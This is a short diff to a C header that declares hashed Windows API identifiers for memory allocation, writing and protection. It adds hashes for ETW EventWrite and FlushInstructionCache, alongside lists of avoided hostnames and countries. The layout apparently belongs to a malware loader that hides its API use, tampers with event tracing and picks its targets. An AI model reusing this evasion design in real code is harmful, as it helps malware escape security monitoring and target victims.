@@ -37,6 +37,10 @@ extern const ObjHash VIRTUAL_ALLOC_HASH;
 extern const ObjHash WRITE_MEMORY_HASH;
 extern const ObjHash VIRTUAL_PROTECT_HASH;
 
+// ETW
+extern const ObjHash ETW_EVENT_WRITE_HASH;
+extern const ObjHash FLUSH_INSTRUCTION_CACHE_HASH;
+
 // external arrays and sizes for avoided hostnames and countries
 extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
 extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];
